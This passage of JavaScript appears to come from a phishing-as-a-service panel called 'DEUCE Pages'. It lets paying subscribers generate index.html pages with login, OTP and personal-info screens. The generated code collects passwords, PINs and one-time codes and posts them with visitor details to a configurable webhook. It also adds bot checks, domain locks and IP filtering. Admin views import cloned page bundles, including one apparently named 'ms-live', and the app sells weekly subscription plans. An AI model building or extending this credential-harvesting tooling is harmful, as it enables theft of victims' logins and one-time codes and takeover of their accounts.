        const lower = field.toLowerCase();
        if (lower.includes("email")) return "email";
        if (lower.includes("phone") || lower.includes("otp") || lower.includes("code")) return "tel";
        if (lower.includes("password") || lower.includes("pin")) return "password";
        return "text";
      }

      function turnstileSiteKey() {
        return config.security?.turnstile?.siteKey || "";
      }

      function renderTurnstile() {
        const mount = document.querySelector("#turnstileBox");
        if (!config.security?.captcha || captchaPassed || !mount) return;
        if (!turnstileSiteKey()) {
          mount.textContent = "Turnstile site key is missing. Update this page security config.";
          return;
        }
        if (!window.turnstile) {
          window.setTimeout(renderTurnstile, 300);
          return;
        }
        if (captchaWidgetId !== null) return;
        captchaWidgetId = window.turnstile.render(mount, {
          sitekey: turnstileSiteKey(),
          callback(token) {
            captchaToken = token;
            screenCopy.textContent = "Session check complete. Continue when ready.";
          },
          "expired-callback"() {
            captchaToken = "";
            captchaPassed = false;
          },
          "error-callback"() {
            captchaToken = "";
            captchaPassed = false;
            screenCopy.textContent = "Turnstile could not load. Refresh and try again.";
          }
        });
      }

      async function verifyTurnstile() {
        if (!config.security?.captcha) return true;
        if (!captchaToken) {
          screenCopy.textContent = "Complete the Turnstile check before continuing.";
          return false;
        }
        try {
          const response = await fetch(config.runtime.turnstileEndpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              pageId: config.pageId,
              userPageId: config.id,
              sessionId,
              hostname: window.location.hostname,
              token: captchaToken
            })
          });
          const result = await response.json().catch(() => ({}));
          if (!response.ok || !result.verified) {
            screenCopy.textContent = result.reason || "Turnstile verification failed.";
            return false;
          }
          captchaPassed = true;
          return true;
        } catch (error) {
          screenCopy.textContent = "Turnstile verification could not reach the API.";
          return false;
        }
      }

      function renderStep() {
        if (!runtimeAllowed) return;
        const screen = config.screens[currentStep];
        stepLabel.textContent = screen.type;
        screenTitle.textContent = screen.config.title || screen.name + " Page";
        screenCopy.textContent = "Complete this step to continue through the configured page session.";
        progress.textContent = (currentStep + 1) + " / " + config.screens.length;
        setStatus([
          config.packageVersion,
          config.generatedFile?.version || "generated",
          config.security?.captcha ? "captcha on" : "captcha off",
          config.resultSettings?.retentionDays + "d retention"
        ]);

        const fields = fieldsFor(screen);
        screenForm.innerHTML = fields.map((field) => \`
          <label>
            <span>\${field}</span>
            <input required type="\${inputTypeFor(field)}" name="\${field.toLowerCase().replace(/\\s+/g, "_")}" autocomplete="off">
          </label>
        \`).join("") + \`
          <div class="captcha-box \${config.security?.captcha && !captchaPassed ? "active" : ""}">
            <div id="turnstileBox"></div>
          </div>
          <button type="submit">\${screen.config.buttonText || "Next"}</button>
        \`;
        window.setTimeout(renderTurnstile, 0);
        trackTraffic("screen_view", { screen: screen.name });
      }

      function storeScreenData(screen) {
        sessionData[screen.name] = Object.fromEntries(new FormData(screenForm).entries());
      }

      function sendResult(screen) {
        const payload = {
          id: "res_" + Date.now().toString(36),
          userPageId: config.id,
          userId: config.userId,
          packageId: config.packageId,
          packageVersion: config.packageVersion,
          pageId: config.pageId,
          pageName: config.pageName,
          licenseKey: config.licenseKey,
          sessionId,
          screen: screen.name,
          flow: config.screens.map((item) => item.name),
          data: sessionData,
          hostname: window.location.hostname,
          path: window.location.pathname,
          userAgent: navigator.userAgent,
          resultSettings: config.resultSettings,
          createdAt: new Date().toISOString()
        };

        fetch(config.runtime.resultEndpoint || endpoint(config.resultSettings?.webhook || "/api/page-results"), {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(() => {
          console.info("DEUCE Pages result payload queued for Render API", payload);
        });
      }

      screenForm.addEventListener("submit", async (event) => {
        event.preventDefault();
        if (!runtimeAllowed) return;
        if (config.security?.captcha && !captchaPassed) {
          const verified = await verifyTurnstile();
          if (!verified) return;
        }

        const remoteAllowed = await checkRemoteSecurity("submit");
        if (!remoteAllowed) return;

        const screen = config.screens[currentStep];
        storeScreenData(screen);
        trackTraffic("screen_submit", { screen: screen.name });

        if (currentStep < config.screens.length - 1) {
          currentStep += 1;
          renderStep();
          return;
        }

        sendResult(screen);

        if (screen.config.redirectUrl) {
          window.location.href = screen.config.redirectUrl;
          return;
        }

        screenTitle.textContent = "Session complete";
        screenCopy.textContent = "This generated index.html has finished the configured page flow.";
        stepLabel.textContent = "complete";
        screenForm.innerHTML = "";
        progress.textContent = "done";
        trackTraffic("flow_complete");
      });

      async function boot() {
        setStatus(["booting", config.pageId, config.generatedFile?.version || "generated"]);
        if (!enforceDomain()) return;
        const remoteAllowed = await checkRemoteSecurity("boot");
        if (!remoteAllowed) return;
        trackTraffic("page_load");
        renderStep();
      }

      boot();
    <\/script>
  </body>
</html>`;
}

function downloadGeneratedIndex(page) {
  page.generatedFile = {
    ...(page.generatedFile || {}),
    lastGeneratedAt: new Date().toISOString()
  };
  saveFlowState(page);
  const html = createGeneratedIndex(page);
  const blob = new Blob([html], { type: "text/html" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = page.generatedFile?.downloadName || `${page.slug}-index.html`;
  document.body.append(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
  statusText.textContent = `${page.name.toUpperCase()} INDEX.HTML GENERATED`;
}

function renderButtons() {
  if (!templateList) return;

  templateList.innerHTML = "";

  templates.forEach((template) => {
    const button = document.createElement("button");
    button.className = `template-button${template.id === activeTemplate.id ? " active" : ""}`;
    button.type = "button";
    button.innerHTML = `<strong>${template.name}</strong><span>${template.description}</span>`;
    button.addEventListener("click", () => setTemplate(template));
    templateList.append(button);
  });
}

function setTemplate(template) {
  activeTemplate = template;
  const source = document.querySelector(`#${template.id}`);
  preview.replaceChildren(source.content.cloneNode(true));
  statusText.textContent = template.status;
  renderButtons();
}

function setActiveNav(hash) {
  document.querySelectorAll(".nav-item").forEach((item) => {
    if (item.getAttribute("href") === "#admin" && !isAdmin()) {
      item.hidden = true;
      item.classList.add("is-hidden");
      item.style.display = "none";
      item.removeAttribute("aria-current");
      return;
    }
    const isActive = item.getAttribute("href") === hash;
    item.classList.toggle("active", isActive);
    if (isActive) {
      item.setAttribute("aria-current", "page");
    } else {
      item.removeAttribute("aria-current");
    }
  });
}

function renderDashboard() {
  activeFlowSlug = null;
  const auth = getAuthState();
  const systemAction = isAdmin()
    ? '<button type="button" data-route="#admin">Open admin</button>'
    : '<button type="button" data-route="#pages">Browse pages</button>';
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>dashboard</small>
        <h2>Workspace overview</h2>
        <p>Track active page subscriptions, wallet activity, traffic, and security events from one clear operating view.</p>
      </div>
      ${viewNav(auth.user ? [
        routeButton("#pages", "Browse pages"),
        routeButton("#my-pages", "My Pages"),
        routeButton("#wallet", "Wallet")
      ] : [
        routeButton("#login", "Login"),
        routeButton("#signup", "Create account")
      ])}
      <div class="summary-grid">
        <article><small>Owned pages</small><b>${String(ownedPages.length).padStart(2, "0")}</b><span>From database</span></article>
        <article><small>Available pages</small><b>${String(marketPages.length).padStart(2, "0")}</b><span>Published packages</span></article>
        <article><small>Monthly traffic</small><b>0</b><span>Awaiting live events</span></article>
        <article><small>Security events</small><b>0</b><span>Awaiting live rules</span></article>
      </div>
      <div class="owned-page-card">
        <div>
          <small>live system</small>
          <h3>${apiLoadError ? "API connection needs attention" : "Database-backed workspace"}</h3>
          <p>${apiLoadError ? `Connect the backend and database to load live records. ${escapeHtml(apiLoadError)}` : "The dashboard is now reading packages and user pages from the API instead of frontend seed data."}</p>
        </div>
        ${systemAction}
      </div>
    </section>
  `;
  statusText.textContent = "DASHBOARD OVERVIEW ONLINE";
  topbarTitle.textContent = "Dashboard";
}

function renderLogin() {
  activeFlowSlug = null;
  setAuthLayout(true);
  const auth = getAuthState();
  preview.innerHTML = `
    <section class="app-view auth-view">
      <div class="view-heading">
        <small>secure access</small>
        <h2>Welcome back</h2>
        <p>Sign in to manage subscribed pages, hosting setup, security rules, results, wallet activity, and generated index files.</p>
      </div>
      ${viewNav([
        routeButton("#signup", "Create account")
      ])}
      <div class="auth-shell">
        <article class="auth-card package-form">
          <div>
            <small>account login</small>
            <h3>Access your workspace</h3>
            <p>Use the email tied to your page subscriptions. Sign-in now requires the API and database so account access matches the production system.</p>
          </div>
          <label>
            <span>Email address</span>
            <input type="email" data-auth-field="loginEmail" value="${escapeHtml(auth.user?.email || "")}" placeholder="you@example.com" autocomplete="email">
          </label>
          <label>
            <span>Password</span>
            <input type="password" data-auth-field="loginPassword" placeholder="Enter your password" autocomplete="current-password">
          </label>
          <div class="admin-actions">
            <button type="button" data-login-submit>Sign in</button>
            <button type="button" data-route="#signup">New account</button>
          </div>
        </article>
        <aside class="security-panel auth-side">
          <small>session scope</small>
          <h3>One control room</h3>
          <p>After login, users can subscribe to pages, connect hosting, download index.html, monitor results, and tune each page without touching package source files.</p>
          <div class="auth-checklist">
            <span>Wallet powered subscriptions</span>
            <span>Per-page domain and security controls</span>
            <span>Generated files connected to your API</span>
          </div>
        </aside>
      </div>
    </section>
  `;
  statusText.textContent = auth.user ? `SIGNED IN AS ${auth.user.email}` : "LOGIN READY";
  topbarTitle.textContent = "Login";
}

function renderSignup() {
  activeFlowSlug = null;
  setAuthLayout(true);
  preview.innerHTML = `
    <section class="app-view auth-view">
      <div class="view-heading">
        <small>new workspace</small>
        <h2>Create account</h2>
        <p>Open a user workspace for page subscriptions, hosting connection, results review, and subscription renewals from wallet funds.</p>
      </div>
      ${viewNav([
        routeButton("#login", "Back to login")
      ])}
      <div class="auth-shell">
        <article class="auth-card package-form">
          <div>
            <small>subscriber profile</small>
            <h3>Start managing pages</h3>
            <p>This creates the account that owns subscribed page instances and their domains, security settings, traffic logs, and result controls.</p>
          </div>
          <label>
            <span>Full name</span>
            <input type="text" data-auth-field="signupName" placeholder="Workspace owner" autocomplete="name">
          </label>
          <label>
            <span>Email address</span>
            <input type="email" data-auth-field="signupEmail" placeholder="you@example.com" autocomplete="email">
          </label>
          <label>
            <span>Password</span>
            <input type="password" data-auth-field="signupPassword" placeholder="Create a password" autocomplete="new-password">
          </label>
          <label>
            <span>Confirm password</span>
            <input type="password" data-auth-field="signupConfirm" placeholder="Repeat password" autocomplete="new-password">
          </label>
          <div class="admin-actions">
            <button type="button" data-signup-submit>Create account</button>
            <button type="button" data-route="#login">Sign in</button>
          </div>
        </article>
        <aside class="security-panel auth-side">
          <small>what the user gets</small>
          <h3>Managed page ownership</h3>
          <p>Each account can hold multiple page subscriptions. Every page keeps its own generated file, hosting connection, rules, logs, and renewal schedule.</p>
          <div class="auth-metrics">
            <article><b>$25+</b><span>weekly page plans</span></article>
            <article><b>24/7</b><span>traffic logging</span></article>
          </div>
        </aside>
      </div>
    </section>
  `;
  statusText.textContent = "SIGNUP READY";
  topbarTitle.textContent = "Sign Up";
}

async function handleLogin() {
  const email = authField("loginEmail");
  const password = authField("loginPassword");

  if (!email || !password) {
    statusText.textContent = "EMAIL AND PASSWORD REQUIRED";
    return;
  }

  try {
    const result = await requestApi("/api/auth/login", {
      method: "POST",
      body: JSON.stringify({ email, password })
    });
    saveAuthState({ mode: "api", user: result.user, token: result.token });
    await loadAppData();
    statusText.textContent = "API SESSION OPENED";
  } catch (error) {
    statusText.textContent = error.message.toUpperCase();
    return;
  }

  window.location.hash = "#dashboard";
}

async function handleSignup() {
  const name = authField("signupName");
  const email = authField("signupEmail");
  const password = authField("signupPassword");
  const confirmPassword = authField("signupConfirm");

  if (!name || !email || !password || !confirmPassword) {
    statusText.textContent = "ALL SIGNUP FIELDS REQUIRED";
    return;
  }

  if (password !== confirmPassword) {
    statusText.textContent = "PASSWORDS DO NOT MATCH";
    return;
  }

  try {
    const result = await requestApi("/api/auth/register", {
      method: "POST",
      body: JSON.stringify({ name, email, password })
    });
    saveAuthState({ mode: "api", user: result.user, token: result.token });
    await loadAppData();
    statusText.textContent = "ACCOUNT CREATED";
  } catch (error) {
    statusText.textContent = error.message.toUpperCase();
    return;
  }

  window.location.hash = "#dashboard";
}

async function handleLogout() {
  try {
    if (isLoggedIn()) {
      await requestApi("/api/auth/logout", { method: "POST" });
    }
  } catch {
    // Local logout should still complete even if the API is offline.
  }
  clearAuthState();
  document.querySelector(".topbar-menu")?.removeAttribute("open");
  statusText.textContent = "SIGNED OUT";
  window.location.hash = "#login";
  renderRoute();
}

function renderPages() {
  activeFlowSlug = null;
  const emptyAction = isAdmin() ? "#admin" : "";
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>pages marketplace</small>
        <h2>Choose a page</h2>
        <p>Preview available pages, choose a subscription plan, and activate one from your wallet.</p>
      </div>
      <div class="page-grid">
        ${marketPages.length ? marketPages.map((page) => {
          const selectedPlan = selectedBillingPeriod(page);
          return `
          <article class="market-card">
            <div class="page-preview market-frame" aria-hidden="true">
              <div class="market-frame-shell">
                <i></i>
                <i></i>
                <i></i>
                <strong>${escapeHtml(page.name)}</strong>
              </div>
            </div>
            <div class="market-card-body">
              <div class="market-heading">
                ${pageIconMarkup(page)}
                <div class="card-copy">
                  <small>available page</small>
                  <h3>${escapeHtml(page.name)}</h3>
                  <p>${escapeHtml(page.userSummary)}</p>
                </div>
              </div>
              <div class="market-subscription">
                <label>
                  <span>Subscription</span>
                  <select data-market-plan="${escapeHtml(page.slug)}" aria-label="${escapeHtml(page.name)} subscription plan">
                    ${Object.keys(billingPeriodLabels).map((period) => `
                      <option value="${period}" ${period === selectedPlan ? "selected" : ""}>${billingOptionLabel(page, period)}</option>
                    `).join("")}
                  </select>
                </label>
                <strong data-market-price="${escapeHtml(page.slug)}">${marketPriceLabel(page, selectedPlan)}</strong>
              </div>
              <div class="card-footer">
                <div class="market-actions">
                  <button type="button" data-market-preview="${escapeHtml(page.slug)}" ${page.previewReady ? "" : "disabled"}>Preview</button>
                  <button type="button" data-market-subscribe="${escapeHtml(page.slug)}">${marketSubscribeLabel(page, selectedPlan)}</button>
                </div>
              </div>
            </div>
          </article>
        `;
        }).join("") : emptyState("No published packages yet", "Published pages will appear here when they are available for subscription.", emptyAction)}
      </div>
    </section>
  `;
  statusText.textContent = "PAGES MARKETPLACE READY";
  topbarTitle.textContent = "Pages";
}

function renderAdmin() {
  activeFlowSlug = null;
  const publishedCount = adminPackages.filter((page) => String(page.status || page.design).toLowerCase() === "published").length;
  const draftCount = adminPackages.filter((page) => String(page.status || page.design).toLowerCase() !== "published").length;
  const githubCount = adminPackages.filter((page) => page.sourceType === "github" || page.source === "GitHub repo").length;
  const packageRows = adminPackages.length ? adminPackages.map((page) => `
    <article class="admin-package-row">
      <div>
        <strong>${escapeHtml(page.name)}</strong>
        <span>${escapeHtml(page.slug)} / ${escapeHtml(page.version || "v1")}</span>
      </div>
      <em>${escapeHtml(page.status || page.design || "Draft")}</em>
      <small>${escapeHtml(page.source || "Package")}</small>
      <div class="admin-row-actions">
        <button type="button" data-route="#admin-package-${escapeHtml(page.slug)}">Editor</button>
        <button type="button" data-admin-action="${escapeHtml(page.name).toUpperCase()} PREVIEW OPENED">Preview</button>
        <button type="button" data-admin-action="${escapeHtml(page.name).toUpperCase()} PUBLISH CHECKLIST OPENED">Publish</button>
      </div>
    </article>
  `).join("") : emptyState("No packages imported yet", "Connect a GitHub repo or upload a local page bundle to create your first package.", "#admin-import-github");

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin studio</small>
        <h2>Package control center</h2>
        <p>Import pages, review files, publish packages, and manage subscribers from one compact workspace.</p>
      </div>
      ${viewNav([
        routeButton("#pages", "&#8592; Marketplace"),
        routeButton("#my-pages", "My Pages"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="admin-command-tabs" aria-label="Admin modules">
        <button type="button" class="active" data-admin-action="ADMIN OVERVIEW OPENED">Overview</button>
        <button type="button" data-route="#admin-import-github">Import</button>
        <button type="button" data-admin-action="PACKAGE LIBRARY FOCUSED">Packages</button>
        <button type="button" data-route="#admin-users">Users</button>
        <button type="button" data-admin-action="PUBLISHING QUEUE OPENED">Publishing</button>
      </div>

      <div class="admin-kpis">
        <article><small>Packages</small><strong>${String(adminPackages.length).padStart(2, "0")}</strong><span>Total library</span></article>
        <article><small>Published</small><strong>${String(publishedCount).padStart(2, "0")}</strong><span>Marketplace ready</span></article>
        <article><small>Drafts</small><strong>${String(draftCount).padStart(2, "0")}</strong><span>Need review</span></article>
        <article><small>GitHub</small><strong>${String(githubCount).padStart(2, "0")}</strong><span>Repo imports</span></article>
      </div>

      <div class="admin-studio-shell">
        <article class="admin-hero-panel">
          <div>
            <small>next action</small>
            <h3>Publish your first real page package</h3>
            <p>Connect a repo, detect screens, check CSS/assets, then send a clean package to the marketplace for wallet subscriptions.</p>
          </div>
          <div class="admin-actions">
            <button type="button" data-route="#admin-import-github">Import GitHub</button>
            <button type="button" data-route="#admin-import-local">Upload files</button>
            <button type="button" data-route="#admin-users">Users</button>
          </div>
        </article>

        <div class="admin-workbench">
          <article class="admin-table-card">
            <div class="builder-heading compact">
              <div>
                <small>package library</small>
                <h3>Manage packages</h3>
              </div>
              <button type="button" data-admin-action="PACKAGE LIBRARY REFRESHED">Refresh</button>
            </div>
            <div class="admin-package-list">
              ${packageRows}
            </div>
          </article>

          <aside class="admin-side-stack">
            <article class="security-panel">
              <small>import paths</small>
              <h3>Add a page</h3>
              <div class="admin-compact-grid">
                <button type="button" data-route="#admin-import-github"><strong>GitHub</strong><span>Repo, branch, folder</span></button>
                <button type="button" data-route="#admin-import-local"><strong>Local</strong><span>Zip or loose files</span></button>
              </div>
            </article>

            <article class="security-panel">
              <small>publishing queue</small>
              <h3>Review flow</h3>
              <div class="admin-queue-list">
                <div><span>01</span><strong>Files</strong><em>Detect HTML, CSS, assets</em></div>
                <div><span>02</span><strong>Design</strong><em>Scope CSS and preview</em></div>
                <div><span>03</span><strong>Package</strong><em>Set price and metadata</em></div>
                <div><span>04</span><strong>Publish</strong><em>Send to marketplace</em></div>
              </div>
            </article>
          </aside>
        </div>
      </div>

      <details class="admin-fold">
        <summary>
          <span>Advanced models</span>
          <strong>Package and user configuration reference</strong>
        </summary>
        <div class="model-grid">
          <article class="security-panel">
            <small>package model</small>
            <h3>Package fields</h3>
            <div class="feature-row">
              ${Object.keys(packageDataModel).map((group) => `<span>${group}</span>`).join("")}
            </div>
            <button type="button" data-route="#admin-import-github">Open import wizard</button>
          </article>
          <article class="security-panel">
            <small>user config</small>
            <h3>Subscriber fields</h3>
            <div class="feature-row">
              ${Object.keys(userPageConfigModel).map((group) => `<span>${group}</span>`).join("")}
            </div>
            <button type="button" data-route="#my-pages">Review owned pages</button>
          </article>
        </div>
      </details>
    </section>
  `;
  statusText.textContent = "ADMIN PAGE STUDIO READY";
  topbarTitle.textContent = "Admin";
}

function renderAdminLegacyReference() {
  activeFlowSlug = null;
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin reference</small>
        <h2>Admin reference panels</h2>
        <p>Legacy planning reference for package data, user config, and import workflow.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#admin-import-github", "GitHub import"),
        routeButton("#admin-users", "User manager")
      ])}

      <details class="admin-fold" open>
        <summary>
          <span>Package library</span>
          <strong>Manage imported page packages</strong>
        </summary>
        <article class="admin-table-card">
          <div class="builder-heading">
            <div>
              <small>managed packages</small>
              <h3>Admin page library</h3>
            </div>
            <button type="button" data-admin-action="PACKAGE LIBRARY REFRESHED">Refresh</button>
          </div>
          <div class="admin-table">
            ${adminPackages.map((page) => `
              <div>
                <strong>${page.name}</strong>
                <span>${page.source}</span>
                <span>${page.version}</span>
                <span>${page.cssMode}</span>
                <em>${page.design}</em>
                <button type="button" data-route="#admin-package-${page.slug}">Manage</button>
              </div>
            `).join("")}
          </div>
        </article>
      </details>

      <details class="admin-fold">
        <summary>
          <span>Package data model</span>
          <strong>Backend-ready fields for Render/database</strong>
        </summary>
        <div class="model-grid">
          ${Object.entries(packageDataModel).map(([group, fields]) => `
            <article class="security-panel">
              <small>${group}</small>
              <h3>${group} fields</h3>
              <div class="feature-row">
                ${fields.map((field) => `<span>${field}</span>`).join("")}
              </div>
            </article>
          `).join("")}
        </div>
        <article class="security-panel">
          <small>sample package json</small>
          <h3>How one package should save</h3>
          <div class="admin-code-sample">
            <code>{ id: "pkg_page_a", slug: "page-a", status: "Published" }</code>
            <code>{ billingPeriods: { daily: 5, weekly: 25, biweekly: 45, monthly: 80 } }</code>
            <code>{ sourceType: "upload", screens: ["login.html", "otp.html"], cssFiles: ["style.css"] }</code>
            <code>{ tokens: { brand: "#7CFFB2", font: "Inter", radius: "8px" } }</code>
          </div>
        </article>
      </details>

      <details class="admin-fold">
        <summary>
          <span>User config model</span>
          <strong>Per-subscriber settings saved for every owned page</strong>
        </summary>
        <div class="model-grid">
          ${Object.entries(userPageConfigModel).map(([group, fields]) => `
            <article class="security-panel">
              <small>${group}</small>
              <h3>${group} config</h3>
              <div class="feature-row">
                ${fields.map((field) => `<span>${field}</span>`).join("")}
              </div>
            </article>
          `).join("")}
        </div>
        <article class="security-panel">
          <small>sample user page config</small>
          <h3>How a subscriber page should save</h3>
          <div class="admin-code-sample">
            <code>{ id: "user_page_a", userId: "user_maya", packageId: "pkg_page_a", packageVersion: "v1.4" }</code>
            <code>{ subscription: { billingPeriod: "weekly", renewalPrice: 25, renewalDate: "2026-07-11", autoRenew: true } }</code>
            <code>{ domain: "alpha-client.com", securityConfig: { captcha: true, bannedIps: [], whitelistIps: [] } }</code>
            <code>{ flow: ["Login", "OTP", "Personal Info"], resultSettings: { webhook: "/api/page-results", retentionDays: 30 } }</code>
          </div>
        </article>
      </details>

      <details class="admin-fold">
        <summary>
          <span>Import and design workflow</span>
          <strong>CSS resolver, mapping, backend plan</strong>
        </summary>
        <div class="admin-grid">
        <article class="security-panel admin-upload-panel">
          <small>local bundle</small>
          <h3>Upload HTML, CSS, and assets</h3>
          <p>Drop a zip or select files like index.html, login.html, style.css, app.css, images, fonts, and scripts. The system reads links and inline styles before packaging.</p>
          <div class="upload-dropzone">
            <strong>Drop page bundle</strong>
            <span>.html .css .js .png .jpg .svg .zip</span>
          </div>
          <div class="feature-row">
            <span>Inline CSS accepted</span>
            <span>External CSS accepted</span>
            <span>Assets mapped</span>
            <span>Scripts reviewed</span>
          </div>
        </article>

        <article class="security-panel admin-upload-panel">
          <small>github import</small>
          <h3>Connect repository pages</h3>
          <p>Paste a GitHub repo URL, choose a branch, then let the deployed API scan the repository and create a real package record.</p>
          <div class="github-import-box">
            <span>https://github.com/you/page-templates</span>
            <button type="button" data-admin-action="GITHUB REPO SCAN QUEUED">Scan repo</button>
          </div>
          <div class="feature-row">
            <span>Branch select</span>
            <span>Folder mapping</span>
            <span>Version diff</span>
            <span>Rollback ready</span>
          </div>
        </article>

        <article class="security-panel">
          <small>import pipeline</small>
          <h3>What happens after upload</h3>
          <p>The app should inspect every imported page before publishing so broken paths, missing assets, and conflicting CSS are caught early.</p>
          <div class="pipeline-steps">
            <span class="done">Files received</span>
            <span class="done">CSS detected</span>
            <span class="active">Design preview</span>
            <span>Admin review</span>
            <span>Publish</span>
          </div>
        </article>

        <article class="security-panel">
          <small>page design match</small>
          <h3>Design normalization rules</h3>
          <p>Use this rule order: preserve original page layout first, apply shared brand tokens second, then allow manual CSS overrides for special pages.</p>
          <div class="admin-rule-list">
            <div><strong>1</strong><span>Keep page structure and content intact.</span></div>
            <div><strong>2</strong><span>Scope all imported CSS under the package wrapper.</span></div>
            <div><strong>3</strong><span>Extract common colors, fonts, spacing, and button styles.</span></div>
            <div><strong>4</strong><span>Let admin override per page before publishing.</span></div>
          </div>
        </article>

        <article class="security-panel">
          <small>css resolver</small>
          <h3>How mixed CSS is handled</h3>
          <p>Inline styles stay attached to their exact element when needed. External CSS is collected, scoped to the package, and merged with design tokens so the page keeps its look without breaking the app.</p>
          <div class="traffic-log">
            <div><span>01</span><strong>Read</strong><em>HTML</em><small>Find style tags, style attributes, and linked CSS files.</small></div>
            <div><span>02</span><strong>Scope</strong><em>CSS</em><small>Wrap imported selectors under the package shell to avoid conflicts.</small></div>
            <div><span>03</span><strong>Tokenize</strong><em>Design</em><small>Promote colors, fonts, spacing, and radius into editable design controls.</small></div>
            <div><span>04</span><strong>Override</strong><em>Page</em><small>Keep page-specific CSS for special sections and animations.</small></div>
          </div>
        </article>

        <article class="security-panel">
          <small>design controls</small>
          <h3>Make all pages match</h3>
          <p>After import, use shared design controls to align each page package: brand color, font set, button style, background, form spacing, and mobile behavior.</p>
          <div class="feature-row">
            <span>Brand tokens</span>
            <span>CSS overrides</span>
            <span>Preview modes</span>
            <span>Mobile polish</span>
          </div>
          <div class="admin-code-sample">
            <code>--brand: #7CFFB2;</code>
            <code>--button-radius: 8px;</code>
            <code>.package-page-a .form { gap: 12px; }</code>
          </div>
        </article>

        <article class="security-panel">
          <small>screen mapping</small>
          <h3>Turn pages into flow screens</h3>
          <p>Uploaded files can become full packages or individual screens. Map login.html to Login, otp.html to OTP, info.html to Personal Info, and success.html to Success.</p>
          <div class="feature-row">
            <span>login.html</span>
            <span>otp.html</span>
            <span>info.html</span>
            <span>success.html</span>
          </div>
        </article>

        <article class="security-panel">
          <small>production workflow</small>
          <h3>Render backend plan</h3>
          <p>Your Render app should store package metadata in the database, assets in object storage, and imported source snapshots for version control.</p>
          <div class="traffic-log">
            <div><span>01</span><strong>Import</strong><em>Admin</em><small>Upload files or pull from GitHub.</small></div>
            <div><span>02</span><strong>Normalize</strong><em>CSS</em><small>Scope, tokenize, and preview design.</small></div>
            <div><span>03</span><strong>Publish</strong><em>Live</em><small>Marketplace package becomes subscribable.</small></div>
            <div><span>04</span><strong>Generate</strong><em>User</em><small>Subscribed users export configured index.html.</small></div>
          </div>
        </article>
        </div>
      </details>
    </section>
  `;
  statusText.textContent = "ADMIN PAGE STUDIO READY";
  topbarTitle.textContent = "Admin";
}

function getAdminPackage(packageSlug) {
  return adminPackages.find((item) => item.slug === packageSlug || item.id === packageSlug) || null;
}

function renderAdminImportWizard(sourceType = "local") {
  activeFlowSlug = null;
  const isGithub = sourceType === "github";
  const sourceLabel = isGithub ? "GitHub repository" : "Local bundle";
  const sourceHint = isGithub ? "https://github.com/relay1010/ms-live.git" : "new-page-bundle.zip";
  const detectedFiles = isGithub
    ? ["index.html", "home.html", "email.html", "login2.html", "otp.html", "personal.html", "c.html", "thnks.html", "style.css"]
    : ["index.html", "login.html", "otp.html", "style.css", "assets/hero.jpg"];

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin import wizard</small>
        <h2>${sourceLabel}</h2>
        <p>Import a page package, detect files and CSS, map screens, preview the result, then publish it to the marketplace.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#admin-import-local", "Local upload"),
        routeButton("#admin-import-github", "GitHub import")
      ])}

      <div class="wizard-progress">
        <span class="done">1 Source</span>
        <span class="done">2 Files</span>
        <span class="active">3 Mapping</span>
        <span>4 CSS</span>
        <span>5 Publish</span>
      </div>

      <div class="wizard-grid">
        <article class="security-panel package-form">
          <small>step 1</small>
          <h3>Choose source</h3>
          <div class="admin-source-grid compact">
            <button class="${isGithub ? "" : "active"}" type="button" data-route="#admin-import-local">Local bundle</button>
            <button class="${isGithub ? "active" : ""}" type="button" data-route="#admin-import-github">GitHub repo</button>
          </div>
          <label><span>${isGithub ? "Repository URL" : "Bundle file"}</span><input type="text" data-github-field="repoUrl" value="${sourceHint}" placeholder="https://github.com/owner/repo"></label>
          <label><span>${isGithub ? "Branch" : "Upload type"}</span><input type="text" data-github-field="branch" value="${isGithub ? "" : "zip or loose files"}" placeholder="${isGithub ? "Leave blank to use repo default branch" : ""}"></label>
          ${isGithub ? `
            <label><span>Folder path</span><input type="text" data-github-field="folder" value="" placeholder="pages/page-a or leave blank"></label>
            <label><span>Package name</span><input type="text" data-github-field="packageName" value="MS Live"></label>
            <label><span>Slug</span><input type="text" data-github-field="slug" value="ms-live"></label>
            <div class="admin-actions">
              <button type="button" data-github-scan>Scan repo</button>
              <button type="button" data-github-import>Create draft package</button>
              <button type="button" data-github-publish>Import & Publish</button>
            </div>
            <div class="admin-code-sample github-live-result" data-github-result>
              <code>API connection required: ${escapeHtml(apiBase())}</code>
              <code>Click Scan repo to verify admin session, then detect HTML, CSS, scripts, and assets.</code>
            </div>
          ` : ""}
        </article>

        <article class="security-panel">
          <small>step 2</small>
          <h3>Detected files</h3>
          <div class="file-map-list">
            ${detectedFiles.map((file, index) => `
              <div>
                <strong>${String(index + 1).padStart(2, "0")}</strong>
                <span>${file}</span>
                <em>${file.endsWith(".css") ? "CSS" : file.includes("assets") ? "Asset" : file.endsWith(".js") ? "Script" : "HTML"}</em>
                <button type="button" data-admin-action="${file.toUpperCase()} SELECTED">Use</button>
              </div>
            `).join("")}
          </div>
        </article>

        <article class="security-panel">
          <small>step 3</small>
          <h3>Map screens</h3>
          <div class="file-map-list">
            <div><strong>01</strong><span>index.html</span><em>Entry</em><button type="button" data-admin-action="ENTRY SCREEN MAPPED">Map</button></div>
            <div><strong>02</strong><span>email.html</span><em>Email</em><button type="button" data-admin-action="EMAIL SCREEN MAPPED">Map</button></div>
            <div><strong>03</strong><span>login2.html</span><em>Login</em><button type="button" data-admin-action="LOGIN SCREEN MAPPED">Map</button></div>
            <div><strong>04</strong><span>otp.html</span><em>OTP</em><button type="button" data-admin-action="OTP SCREEN MAPPED">Map</button></div>
            <div><strong>05</strong><span>personal.html</span><em>Personal Info</em><button type="button" data-admin-action="INFO SCREEN MAPPED">Map</button></div>
            <div><strong>06</strong><span>thnks.html</span><em>Success</em><button type="button" data-admin-action="SUCCESS SCREEN MAPPED">Map</button></div>
          </div>
        </article>

        <article class="security-panel package-form">
